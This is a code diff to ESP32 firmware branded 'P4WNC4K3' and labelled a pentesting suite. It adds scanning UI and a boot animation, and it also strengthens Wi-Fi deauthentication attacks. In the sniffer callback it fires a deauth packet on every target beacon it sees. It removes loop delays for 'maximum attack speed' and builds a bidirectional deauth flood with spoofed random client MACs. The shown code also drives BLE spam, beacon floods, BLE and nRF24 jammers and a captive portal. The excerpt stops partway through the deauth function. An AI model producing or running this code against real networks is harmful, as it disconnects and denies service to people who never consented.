@@ -28,6 +28,9 @@ WebServer webServer(80);
 #define HSPI_MISO 12
 #define HSPI_MOSI 13
 #define HSPI_SCLK 14
+#define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
+#define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
+#define COLOR_LIME          0x87F0  // Lime green accent
 
 SPIClass hspi(HSPI);
 RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN);
@@ -80,6 +83,14 @@ float skullVelX = 2;
 float skullVelY = 1.5;
 unsigned long lastAnimTime = 0;
 bool showSkull = false;
+
+bool continuousWiFiScan = false;
+unsigned long lastWiFiScanTime = 0;
+int scanDisplayOffset = 0;
+const int MAX_DISPLAY_APS = 7;
+
+bool continuousBLEScan = false;
+unsigned long lastBLEScanUpdate = 0;
 
 // AirTag/Apple Find My detection
 struct AirTagDevice {
@@ -216,6 +227,39 @@ void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) 
   
   if (frameType == 0x80) {
     beaconCount++;
+    
+    // AGGRESSIVE: If deauth is active, immediately send deauth when we see a beacon
+    if (deauthActive) {
+      // Check if this beacon is from our target
+      bool isTarget = true;
+      for (int i = 0; i < networkCount; i++) {
+        if (networks[i].ssid == selectedSSID) {
+          // Compare BSSID (bytes 10-15 of beacon)
+          for (int j = 0; j < 6; j++) {
+            if (pkt->payload[10 + j] != networks[i].bssid[j]) {
+              isTarget = false;
+              break;
+            }
+          }
+          
+          if (isTarget) {
+            // Immediately send deauth
+            uint8_t deauthPacket[26] = {
+              0xC0, 0x00, 0x00, 0x00,
+              0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast
+              pkt->payload[10], pkt->payload[11], pkt->payload[12],
+              pkt->payload[13], pkt->payload[14], pkt->payload[15], // AP as source
+              pkt->payload[10], pkt->payload[11], pkt->payload[12],
+              pkt->payload[13], pkt->payload[14], pkt->payload[15], // BSSID
+              0x00, 0x00, 0x07, 0x00
+            };
+            
+            esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+          }
+          break;
+        }
+      }
+    }
   }
   else if ((frameType & 0x0C) == 0x08) {
     dataCount++;
@@ -375,106 +419,267 @@ void setup() {
   drawMainMenu();
 }
 
+// Add this color definition at the top with your other colors
+#define COLOR_MATRIX_GREEN  0x07E0  // Bright Matrix green
+#define COLOR_DARK_GREEN    0x0320  // Dark green for fade effect
+#define COLOR_LIME          0x87F0  // Lime green accent
+
 void playBootAnimation() {
   tft.fillScreen(COLOR_BG);
   
-  // YOUR SKULL - SCALED DOWN VERSION (RED)
+  // PHASE 1: Matrix rain effect (quick)
+  drawMatrixRain();
+  
+  // PHASE 2: Glitch effect transition
+  glitchTransition();
+  
+  // PHASE 3: Main skull reveal
+  drawHackerSkull();
+  
+  // PHASE 4: System initialization
+  systemBootSequence();
+  
+  // Clear and transition to main menu
+  fadeToBlack();
+  currentState = MAIN_MENU;
+}
+
+void drawMatrixRain() {
+  // Quick matrix rain effect (1 second)
+  tft.fillScreen(COLOR_BG);
+  
+  for (int frame = 0; frame < 15; frame++) {
+    // Random matrix characters falling
+    for (int col = 0; col < 8; col++) {
+      int x = col * 30 + random(0, 10);
+      int y = random(0, SCREEN_HEIGHT);
+      
+      // Fade effect - brighter at bottom
+      uint16_t color = (y > SCREEN_HEIGHT / 2) ? COLOR_MATRIX_GREEN : COLOR_DARK_GREEN;
+      
+      tft.setTextColor(color);
+      tft.setTextSize(1);
+      tft.setCursor(x, y);
+      
+      // Random characters
+      char c = random(0, 2) ? (char)random(48, 58) : (char)random(65, 91);
+      tft.print(c);
+    }
+    delay(50);
+  }
+}
+
+void glitchTransition() {
+  // Glitch effect - screen flicker
+  for (int i = 0; i < 3; i++) {
+    tft.fillScreen(COLOR_MATRIX_GREEN);
+    delay(30);
+    tft.fillScreen(COLOR_BG);
+    delay(50);
+  }
+}
+
+void drawHackerSkull() {
+  tft.fillScreen(COLOR_BG);
+  
   const char* skullLines[] = {
-    "       uuuuuuuuuuuuuuu.",
-    "     .u$$$$$$$$$$$$$$$$$$W.",
-    "   u$$$$$$$$$$$$$$$$$$$$$$$Wu.",
-    "  $$$$$$$$$$$$$$$$$$$$$$$$$$$$i",
-    " $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    " $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    ".i$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$i",
-    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$W",
-    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$W",
-    "#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$.",
-    "W$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    "#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$~",
-    "\"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    "#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$",
-    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#",
-    "$iW$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!",
-    "$$$$$#\"\" `\"\"#$$$$$$#\"\"\"\"#$$$$$$$$$W",
-    "$$#\"      !$$$`      `\"#$$$$$$$#",
-    "``      !iuW$$$        #$$$$$$#",
-    "$u       $  $$$$         $$$$$$~",
-    "#$$i.    #  $$$$.        `$$$$$",
-    "$$$$i.      \"#$$i.        .$$#",
-    "$$$$$!         $$$$$i      $$$$",
-    "`$$$  $iWW     #$$$$W.    .$$$$#",
-    "\"#$$$$$$$#`    $$$$$$iWiuuW$$$$$W",
-    "!#\"\"  \"\"       `$$$$#$$$$$$$$$$",
-    "i$$$$  .         !$$$$ .$$$$$$$$#",
-    "$$$$$$`          $$$$$$Wi$$$#\"#$`",
-    "#$$$$$$W.        $$$$$$$$$#",
-    "`$$##$$$!  i$u.  .i$$$$$$#\"\"",
-    "\"   `#W    $$$$$$$$$$$$$`   u$#",
-    "        W$$$$$$$$$$$$$   $$$$W",
-    "        $$`!$$#$$``$$$   $$$$!",
-    "       i$\" $$$  $#` \"\"\"  W$$$$",
-    "                        W$$$$!",
-    "  uW$$  uu  uu.  $$ $$$Wu# $$$$$",
-    " ~$$$$iu$$iu$$$uW$! $$$$$i.W$$$$$",
-    "..  \"#$$$$$$$$#$$$$$$$$$$$$$$$#\"",
-    "$$W   \"#$$$$$iW$$$$$$$$$$$$$$$W",
-    "$`      \"\"#$$$$$$$$$$$$$$$$$$$",
-    "          !$$$$$$$$$$$$$$$$#`",
-    "          $$$$$$$$$$$$$$$$$!",
-    "        $$$$$$$$$$$$$$$$$$`",
-    "         $$$$$$$$$$$$$$$\""
+    "                      :::!~!!!!!:.",
+    "                  .xUHWH!! !!?M88WHX:.",
+    "                .X*#M@$!!  !X!M$$$WWx:.",
+    "               :!!!!!!?H! :!$!$$$$$8X:",
+    "              !!~  ~:~!! :~!$!#$$$$$8X:",
+    "             :!~::!H!<   ~.U$X!?R$$$$MM!",
+    "             ~!~!!!!~~ .:XW$$U!!?$$$RMM!",
+    "               !:~~~ .:!M\"T#$$WX??#MRRMMM!",
+    "               ~?WuxiW*`   `\"#$$8!!!!??!!!",
+    "             :X- M$$       `\"T#$T~!8$WUXU~",
+    "            :%`  ~#$$m:        ~!~ ?$$$",
+    "          :!`.-   ~T$$8xx.  .xWW- ~\"\"##*\"",
+    ".....   -~~:<` !    ~?T#$@@W@*?$      /`",
+    "W$@@M!!! .!~~ !!     .:XUW$W!~ `\"~:    :",
+    "#\"~~`.:x%`!!  !H:   !WM$$Ti.: .!WUn+!`",
+    ":::~:!!`:X~ .: ?H.!u \"$$B$$!W:U!T$M~",
+    ".~~   :X@!.-~   ?@WTWo(\"*$$W$TH$! `",
+    "Wi.~!X$?!-~    : ?$$B$Wu(\"**$RM!",
+    "$R@i.~~ !     :   ~$$$B$en:``",
+    "?MXT@Wx.~    :     ~\"##*$$M~"
   };
   
-  const int numLines = 46;
-  int lineHeight = 4;  // Tight spacing
+  const int numLines = 20;
+  int lineHeight = 3;
+  int startY = 10;
   
-  // Center the skull
-  int maxLineWidth = 0;
-  for (int i = 0; i < numLines; i++) {
-    int len = strlen(skullLines[i]);
-    if (len > maxLineWidth) maxLineWidth = len;
-  }
-  
-  int charWidth = 5;
-  int skullPixelWidth = maxLineWidth * charWidth;
-  int startX = (SCREEN_WIDTH - skullPixelWidth) / 2;
-  int startY = 5;  // Near top
-  
-  // Draw line by line from top to bottom (Marauder style)
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_CRITICAL);  // RED
-  
-  for (int i = 0; i < numLines; i++) {
-    int lineLen = strlen(skullLines[i]);
-    int lineStartX = startX + ((maxLineWidth - lineLen) * charWidth / 2);
+  // Scan from top to bottom revealing the skull
+  for (int scanLine = 0; scanLine < 70; scanLine++) {
+    // Draw all visible lines up to scan position
+    for (int i = 0; i < numLines; i++) {
+      int lineY = startY + (i * lineHeight);
+      
+      if (lineY <= scanLine) {
+        int lineLen = strlen(skullLines[i]);
+        int lineStartX = (SCREEN_WIDTH - (lineLen * 3)) / 2;
+        
+        // Progressive color - brighter as scan reveals
+        uint16_t color = (scanLine - lineY < 5) ? COLOR_LIME : COLOR_MATRIX_GREEN;
+        
+        tft.setTextColor(color);
+        tft.setTextSize(1);
+        tft.setCursor(lineStartX, lineY);
+        tft.print(skullLines[i]);
+      }
+    }
     
-    tft.setCursor(lineStartX, startY + (i * lineHeight));
-    tft.print(skullLines[i]);
-    delay(30);  // Fast line-by-line reveal
+    // Scan line effect
+    tft.drawFastHLine(0, scanLine, SCREEN_WIDTH, COLOR_LIME);
+    tft.drawFastHLine(0, scanLine - 1, SCREEN_WIDTH, COLOR_DARK_GREEN);
+    tft.drawFastHLine(0, scanLine - 2, SCREEN_WIDTH, COLOR_BG);
+    
+    delay(10);
   }
   
-  // Skull complete
-  delay(500);
+  delay(400);
+}
+
+void drawScanLine(int y) {
+  // Quick horizontal scan line
+  for (int x = 0; x < SCREEN_WIDTH; x += 20) {
+    tft.drawFastHLine(x, y, 15, COLOR_DARK_GREEN);
+  }
+  delay(10);
+}
+
+void systemBootSequence() {
+  // Boot text at bottom - hacker terminal style
+  tft.fillRect(0, 220, SCREEN_WIDTH, 100, COLOR_BG);
   
-  // Title at bottom
-  tft.setTextColor(COLOR_ACCENT);
-  tft.setTextSize(2);
-  tft.setCursor(50, 295);
-  tft.println("P4WNC4K3");
+  const char* bootMsgs[] = {
+    "> Initializing core...",
+    "> Loading modules...",
+    "> WiFi engine: READY",
+    "> BLE scanner: READY",
+    "> nRF24 jammer: READY",
+    "> System armed.",
+    ""
+  };
   
+  int msgCount = 7;
+  int y = 225;
+  
+  for (int i = 0; i < msgCount; i++) {
+    tft.setTextColor(COLOR_MATRIX_GREEN);
+    tft.setTextSize(1);
+    tft.setCursor(10, y);
+    
+    // Type out each message
+    int len = strlen(bootMsgs[i]);
+    for (int j = 0; j < len; j++) {
+      tft.print(bootMsgs[i][j]);
+      delay(15);
+    }
+    
+    // Blinking cursor effect
+    for (int blink = 0; blink < 2; blink++) {
+      tft.fillRect(10 + (len * 6), y, 6, 8, COLOR_MATRIX_GREEN);
+      delay(100);
+      tft.fillRect(10 + (len * 6), y, 6, 8, COLOR_BG);
+      delay(100);
+    }
+    
+    y += 12;
+  }
+  
+  delay(300);
+  
+  // EPIC NAME REVEAL - Large glowing text
+  tft.fillScreen(COLOR_BG);
+  
+  // Draw name with glow effect
+  for (int glow = 0; glow < 3; glow++) {
+    // Shadow/glow layers
+    tft.setTextSize(3);
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(32, 142);
+    tft.println("P4WNC4K3");
+    
+    tft.setTextColor(COLOR_MATRIX_GREEN);
+    tft.setCursor(30, 140);
+    tft.println("P4WNC4K3");
+    
+    delay(100);
+  }
+  
+  // Subtitle with flicker
+  delay(200);
+  for (int i = 0; i < 3; i++) {
+    tft.setTextSize(1);
+    tft.setTextColor(COLOR_LIME);
+    tft.setCursor(45, 180);
+    tft.println("[ PENTESTING SUITE ]");
+    delay(100);
+    tft.fillRect(45, 180, 150, 10, COLOR_BG);
+    delay(50);
+  }
+  
+  tft.setTextColor(COLOR_LIME);
+  tft.setCursor(45, 180);
+  tft.println("[ PENTESTING SUITE ]");
+  
+  // Status indicator
+  tft.fillCircle(SCREEN_WIDTH / 2, 210, 3, COLOR_MATRIX_GREEN);
+  tft.setTextColor(COLOR_MATRIX_GREEN);
   tft.setTextSize(1);
-  tft.setTextColor(COLOR_WARNING);
-  tft.setCursor(80, 312);
-  tft.println("READY");
+  tft.setCursor(85, 225);
+  tft.println("SYSTEM READY");
   
   delay(800);
-  
-  // CRITICAL: Clear screen before main menu
+}
+
+void fadeToBlack() {
+  // Quick fade out
+  for (int fade = 0; fade < 3; fade++) {
+    tft.fillScreen(COLOR_BG);
+    delay(30);
+    tft.fillRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, COLOR_DARK_GREEN);
+    delay(30);
+  }
   tft.fillScreen(COLOR_BG);
-  currentState = MAIN_MENU;
+}
+
+// BONUS: Glitch text effect for the name (optional)
+void drawGlitchText(const char* text, int x, int y, int size) {
+  for (int glitch = 0; glitch < 5; glitch++) {
+    // Offset positions for glitch
+    int offsetX = random(-2, 3);
+    int offsetY = random(-1, 2);
+    
+    // RGB split effect
+    tft.setTextSize(size);
+    
+    // Red channel
+    tft.setTextColor(COLOR_CRITICAL);
+    tft.setCursor(x + offsetX - 2, y + offsetY);
+    tft.print(text);
+    
+    // Green channel
+    tft.setTextColor(COLOR_MATRIX_GREEN);
+    tft.setCursor(x + offsetX, y + offsetY);
+    tft.print(text);
+    
+    // Blue channel
+    tft.setTextColor(COLOR_ACCENT);
+    tft.setCursor(x + offsetX + 2, y + offsetY);
+    tft.print(text);
+    
+    delay(30);
+    
+    // Clear with slight offset
+    tft.fillRect(x - 10, y - 5, 200, size * 10, COLOR_BG);
+  }
+  
+  // Final solid render
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.setCursor(x, y);
+  tft.print(text);
 }
 
 void addToConsole(String message) {
@@ -911,6 +1116,14 @@ void handleTouch() {
 }
 
 void handleBackButton() {
+  if (continuousWiFiScan) {
+    continuousWiFiScan = false;
+    WiFi.scanDelete();
+  }
+  if (continuousBLEScan) {
+    continuousBLEScan = false;
+    if (pBLEScan) pBLEScan->stop();
+  }
   if (currentState == BLE_JAM_ACTIVE) stopBLEJammer();
   if (currentState == SNIFFER_ACTIVE) stopSniffer();
   if (currentState == NRF_JAM_ACTIVE) stopNRFJammer();
@@ -1185,18 +1398,37 @@ void handleMoreToolsTouch(int x, int y) {
 }
 
 void handleWiFiScanTouch(int x, int y) {
-  int startY = HEADER_HEIGHT + 5;
-  int itemHeight = 37;
+  int startY = HEADER_HEIGHT + 25;
+  int itemHeight = 34;
   
-  if (y < startY || y > startY + (itemHeight * 6)) return;
-  
-  int clickedIndex = (y - startY) / itemHeight;
-  
-  if (clickedIndex >= 0 && clickedIndex < networkCount && clickedIndex < 6) {
-    selectedIndex = clickedIndex;
-    selectedSSID = networks[clickedIndex].ssid;
-    currentState = WIFI_ATTACK_MENU;
-    drawAttackMenu();
+  // Check if touching network list
+  if (y >= startY && y <= startY + (itemHeight * MAX_DISPLAY_APS)) {
+    int clickedIndex = (y - startY) / itemHeight + scanDisplayOffset;
+    
+    if (clickedIndex >= 0 && clickedIndex < networkCount) {
+      selectedIndex = clickedIndex;
+      selectedSSID = networks[clickedIndex].ssid;
+      
+      // Stop continuous scan
+      continuousWiFiScan = false;
+      WiFi.scanDelete();
+      
+      currentState = WIFI_ATTACK_MENU;
+      drawAttackMenu();
+    }
+  }
+  // Scroll down (touch bottom third)
+  else if (y > SCREEN_HEIGHT - 100 && y < SCREEN_HEIGHT - 60 && 
+           scanDisplayOffset + MAX_DISPLAY_APS < networkCount) {
+    scanDisplayOffset += MAX_DISPLAY_APS;
+    displayWiFiScanResults();
+  }
+  // Scroll up (touch near scroll text)
+  else if (y > SCREEN_HEIGHT - 140 && y < SCREEN_HEIGHT - 100 && 
+           scanDisplayOffset > 0) {
+    scanDisplayOffset -= MAX_DISPLAY_APS;
+    if (scanDisplayOffset < 0) scanDisplayOffset = 0;
+    displayWiFiScanResults();
   }
 }
 
@@ -1226,19 +1458,67 @@ void loop() {
     animateSkull();
     lastAnimTime = millis();
   }
-  
-  // INSTANT DEAUTH - Send as fast as possible
-  if (deauthActive) {
-    performDeauth();
-    // NO DELAY - Maximum aggression
+
+  if (continuousWiFiScan && currentState == WIFI_SCAN) {
+    int scanStatus = WiFi.scanComplete();
+    
+    if (scanStatus >= 0) {  // Scan complete
+      // Update network list
+      networkCount = (scanStatus > 50) ? 50 : scanStatus;
+      
+      for (int i = 0; i < networkCount; i++) {
+        networks[i].ssid = WiFi.SSID(i);
+        networks[i].rssi = WiFi.RSSI(i);
+        networks[i].channel = WiFi.channel(i);
+        networks[i].isEncrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
+        
+        uint8_t* bssid = WiFi.BSSID(i);
+        if (bssid != nullptr) {
+          memcpy(networks[i].bssid, bssid, 6);
+        }
+      }
+      
+      // Refresh display
+      if (millis() - lastWiFiScanTime > 300) {  // Throttle updates
+        displayWiFiScanResults();
+        lastWiFiScanTime = millis();
+      }
+      
+      // Start next scan immediately
+      WiFi.scanDelete();
+      WiFi.scanNetworks(true);
+    }
   }
   
-  // INSTANT BEACON FLOOD
+  // CONTINUOUS BLE SCAN UPDATE
+  if (continuousBLEScan && currentState == BLE_SCAN_RESULTS) {
+    if (millis() - lastBLEScanUpdate > 2000) {  // Update every 2 seconds
+      BLEScanResults results = pBLEScan->getResults();
+      bleDeviceCount = results.getCount();
+      if (bleDeviceCount > 50) bleDeviceCount = 50;
+      
+      for (int i = 0; i < bleDeviceCount; i++) {
+        BLEAdvertisedDevice device = results.getDevice(i);
+        bleDevices[i].address = device.getAddress().toString().c_str();
+        bleDevices[i].name = device.haveName() ? device.getName().c_str() : "Unknown";
+        bleDevices[i].rssi = device.getRSSI();
+      }
+      
+      displayBLEScanResults();
+      lastBLEScanUpdate = millis();
+    }
+  }
+  
+  // CRITICAL: ZERO delay between deauth packets
+  if (deauthActive) {
+    performDeauth();
+    // NO delay(1) here - attack at maximum speed
+  }
+  
   if (beaconFloodActive) {
     performBeaconFlood();
   }
   
-  // INSTANT BLE SPAM - Remove timing restriction
   if (appleSpamActive) {
     performAppleSpam();
   }
@@ -1247,23 +1527,20 @@ void loop() {
     performAndroidSpam();
   }
   
-  // INSTANT BLE JAMMER
   if (bleJammerActive) {
     performBLEJam();
   }
 
-  // INSTANT NRF JAMMER
   if (nrfJammerActive) {
     performNRFJam();
   }
   
-  // Handle captive portal
   if (portalActive) {
     dnsServer.processNextRequest();
     webServer.handleClient();
   }
   
-  // Update displays if needed (less frequently for speed)
+  // Update displays less frequently
   if (snifferActive && currentState == SNIFFER_ACTIVE) {
     if (millis() % 1000 < 50) {
       updateSnifferDisplay();
@@ -1271,102 +1548,120 @@ void loop() {
   }
   
   if (bleJammerActive && currentState == BLE_JAM_ACTIVE) {
-    if (millis() % 500 < 50) {  // Update faster
+    if (millis() % 500 < 50) {
       updateBLEJammerDisplay();
     }
   }
   
   if (nrfJammerActive && currentState == NRF_JAM_ACTIVE) {
-    if (millis() % 500 < 50) {  // Update faster
+    if (millis() % 500 < 50) {
       updateNRFJammerDisplay();
     }
   }
   
-  delay(1);  // Minimal delay for stability
+  // REMOVED: delay(1) - we want maximum attack speed
 }
 
 // ==================== WiFi Functions ====================
 
 void scanWiFiNetworks() {
-  tft.fillScreen(COLOR_BG);
-  drawHeader("SCANNING...");
-  
-  tft.setTextSize(2);
-  tft.setTextColor(COLOR_ACCENT);
-  tft.setCursor(60, 120);
-  tft.println("Scanning");
-  
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(80, 145);
-  tft.println("Please wait...");
-  
-  addToConsole("WiFi scan started");
+  // Start continuous async scan
+  continuousWiFiScan = true;
+  networkCount = 0;
+  scanDisplayOffset = 0;
   
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
   
-  int n = WiFi.scanNetworks();
-  networkCount = (n > 50) ? 50 : n;
+  currentState = WIFI_SCAN;
+  addToConsole("AP scan started");
   
-  addToConsole("Found " + String(networkCount) + " APs");
+  // Start async scan (non-blocking)
+  WiFi.scanNetworks(true);  // true = async mode
   
-  for (int i = 0; i < networkCount; i++) {
-    networks[i].ssid = WiFi.SSID(i);
-    networks[i].rssi = WiFi.RSSI(i);
-    networks[i].channel = WiFi.channel(i);
-    networks[i].isEncrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
-    
-    uint8_t* bssid = WiFi.BSSID(i);
-    if (bssid != nullptr) {
-      memcpy(networks[i].bssid, bssid, 6);
-    }
-  }
-  
+  // Initial display
   displayWiFiScanResults();
 }
 
 void displayWiFiScanResults() {
   currentState = WIFI_SCAN;
   tft.fillScreen(COLOR_BG);
-  drawHeader("NETWORKS");
   
-  int y = HEADER_HEIGHT + 5;
-  int displayCount = min(networkCount, 6);
+  // Header with live indicator
+  tft.fillRect(0, 0, SCREEN_WIDTH, HEADER_HEIGHT, COLOR_HEADER);
+  tft.drawLine(0, HEADER_HEIGHT-1, SCREEN_WIDTH, HEADER_HEIGHT-1, COLOR_ACCENT);
   
-  for (int i = 0; i < displayCount; i++) {
-    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 35, COLOR_ITEM_BG);
-    tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 35, COLOR_BORDER);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setTextSize(2);
+  tft.setCursor(10, 10);
+  tft.print("SCANNING");
+  
+  // Blinking LIVE indicator
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(SCREEN_WIDTH - 15, 17, 4, blink ? COLOR_SUCCESS : COLOR_WARNING);
+  
+  // Status bar
+  int statusY = HEADER_HEIGHT + 5;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_ACCENT);
+  tft.setCursor(SIDE_MARGIN, statusY);
+  tft.printf("APs: %d", networkCount);
+  
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SCREEN_WIDTH - 60, statusY);
+  tft.print("LIVE");
+  
+  // Draw network list
+  int y = HEADER_HEIGHT + 25;
+  int displayCount = min(networkCount, MAX_DISPLAY_APS);
+  
+  for (int i = scanDisplayOffset; i < scanDisplayOffset + displayCount && i < networkCount; i++) {
+    // Background
+    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_ITEM_BG);
+    tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 32, COLOR_BORDER);
     
+    // SSID
     tft.setTextSize(1);
     tft.setTextColor(COLOR_TEXT);
     tft.setCursor(SIDE_MARGIN + 5, y + 5);
     
     String displaySSID = networks[i].ssid;
-    if (displaySSID.length() > 28) {
-      displaySSID = displaySSID.substring(0, 28) + "..";
-    }
+    if (displaySSID.length() == 0) displaySSID = "<Hidden>";
+    if (displaySSID.length() > 26) displaySSID = displaySSID.substring(0, 26);
     tft.println(displaySSID);
     
-    tft.setCursor(SIDE_MARGIN + 5, y + 20);
+    // Signal strength bar (visual indicator)
+    int rssi = networks[i].rssi;
+    int barWidth = map(constrain(rssi, -100, -30), -100, -30, 5, 80);
+    uint16_t barColor = (rssi > -50) ? COLOR_SUCCESS : (rssi > -70) ? COLOR_WARNING : COLOR_CRITICAL;
+    
+    tft.fillRect(SIDE_MARGIN + 5, y + 20, barWidth, 4, barColor);
+    
+    // RSSI and Channel
+    tft.setTextColor(COLOR_TEXT);
+    tft.setCursor(SIDE_MARGIN + 90, y + 18);
+    tft.printf("%ddBm", rssi);
+    
     tft.setTextColor(networks[i].isEncrypted ? COLOR_WARNING : COLOR_SUCCESS);
+    tft.setCursor(SIDE_MARGIN + 140, y + 18);
     tft.print(networks[i].isEncrypted ? "LOCK" : "OPEN");
     
-    tft.setTextColor(COLOR_TEXT);
-    tft.print(" ");
-    tft.print(networks[i].rssi);
-    tft.print("dBm Ch:");
-    tft.print(networks[i].channel);
+    tft.setTextColor(COLOR_ACCENT);
+    tft.setCursor(SIDE_MARGIN + 185, y + 18);
+    tft.printf("Ch%d", networks[i].channel);
     
-    y += 37;
+    y += 34;
   }
   
-  if (networkCount > 6) {
-    tft.setTextColor(COLOR_ACCENT);
+  // Scroll indicator
+  if (networkCount > MAX_DISPLAY_APS) {
+    tft.setTextColor(COLOR_PURPLE);
     tft.setTextSize(1);
-    tft.setCursor(90, y + 5);
-    tft.printf("+%d more", networkCount - 6);
+    tft.setCursor(SCREEN_WIDTH / 2 - 30, y + 5);
+    tft.printf("Scroll %d/%d", (scanDisplayOffset / MAX_DISPLAY_APS) + 1, 
+               (networkCount + MAX_DISPLAY_APS - 1) / MAX_DISPLAY_APS);
   }
   
   drawBackButton();
@@ -1419,45 +1714,90 @@ void performDeauth() {
   
   if (targetIndex == -1) return;
   
-  // Deauth packet template
+  // Proper 26-byte deauth packet (matching Marauder)
   uint8_t deauthPacket[26] = {
-    0xC0, 0x00,  // Type/Subtype: Deauthentication
-    0x00, 0x00,  // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP BSSID
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
-    0x00, 0x00,  // Sequence number
-    0x07, 0x00   // Reason code: Class 3 frame received from nonassociated STA
+    0xC0, 0x00,                          // Type/Subtype: Deauthentication (0xC0)
+    0x00, 0x00,                          // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination [4-9]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source [10-15]
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID [16-21]
+    0x00, 0x00,                          // Sequence/Fragment number
+    0x07, 0x00                           // Reason code: Class 3 frame from non-associated STA
   };
   
-  // AGGRESSIVE MODE: Send MULTIPLE deauth packets per cycle
-  // This mimics Marauder's aggressive deauth
-  for (int burst = 0; burst < 5; burst++) {  // 5 packets per burst
-    // Set AP as source
-    memcpy(&deauthPacket[10], networks[targetIndex].bssid, 6);
-    memcpy(&deauthPacket[16], networks[targetIndex].bssid, 6);
+  uint8_t *bssid = networks[targetIndex].bssid;
+  
+  // MARAUDER STYLE: Send 3 packets in EACH direction (6 total per burst)
+  // This is the key - constant bidirectional flooding
+  
+  for (int burst = 0; burst < 10; burst++) {  // 10 bursts = 60 packets per cycle
     
-    // Broadcast deauth (AP -> All clients)
+    // === DIRECTION 1: AP -> Broadcast (disconnect all clients) ===
+    deauthPacket[4] = 0xFF;  // Destination: Broadcast
+    deauthPacket[5] = 0xFF;
+    deauthPacket[6] = 0xFF;
+    deauthPacket[7] = 0xFF;
+    deauthPacket[8] = 0xFF;
+    deauthPacket[9] = 0xFF;
+    
+    deauthPacket[10] = bssid[0];  // Source: AP BSSID
+    deauthPacket[11] = bssid[1];
+    deauthPacket[12] = bssid[2];
+    deauthPacket[13] = bssid[3];
+    deauthPacket[14] = bssid[4];
+    deauthPacket[15] = bssid[5];
+    
+    deauthPacket[16] = bssid[0];  // BSSID: AP
+    deauthPacket[17] = bssid[1];
+    deauthPacket[18] = bssid[2];
+    deauthPacket[19] = bssid[3];
+    deauthPacket[20] = bssid[4];
+    deauthPacket[21] = bssid[5];
+    
+    // Send 3 times (Marauder style)
     esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
-    deauthPacketsSent++;
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    deauthPacketsSent += 3;
     
-    // CRITICAL: Also send deauth from random client MACs to AP
-    // This catches clients trying to reconnect
+    // === DIRECTION 2: Random Client -> AP (block reconnections) ===
+    // Generate random client MAC
     uint8_t randomClient[6];
     for (int j = 0; j < 6; j++) {
       randomClient[j] = random(0, 256);
     }
+    // Ensure it's a valid unicast address
+    randomClient[0] = (randomClient[0] & 0xFE) | 0x02; // Set locally administered bit
     
-    // Client -> AP deauth
-    memcpy(&deauthPacket[4], networks[targetIndex].bssid, 6);  // Destination: AP
-    memcpy(&deauthPacket[10], randomClient, 6);  // Source: Random client
-    memcpy(&deauthPacket[16], networks[targetIndex].bssid, 6);  // BSSID: AP
+    deauthPacket[4] = bssid[0];  // Destination: AP
+    deauthPacket[5] = bssid[1];
+    deauthPacket[6] = bssid[2];
+    deauthPacket[7] = bssid[3];
+    deauthPacket[8] = bssid[4];
+    deauthPacket[9] = bssid[5];
     
+    deauthPacket[10] = randomClient[0];  // Source: Random client
+    deauthPacket[11] = randomClient[1];
+    deauthPacket[12] = randomClient[2];
+    deauthPacket[13] = randomClient[3];
+    deauthPacket[14] = randomClient[4];
+    deauthPacket[15] = randomClient[5];
+    
+    deauthPacket[16] = bssid[0];  // BSSID: AP
+    deauthPacket[17] = bssid[1];
+    deauthPacket[18] = bssid[2];
+    deauthPacket[19] = bssid[3];
+    deauthPacket[20] = bssid[4];
+    deauthPacket[21] = bssid[5];
+    
+    // Send 3 times (Marauder style)
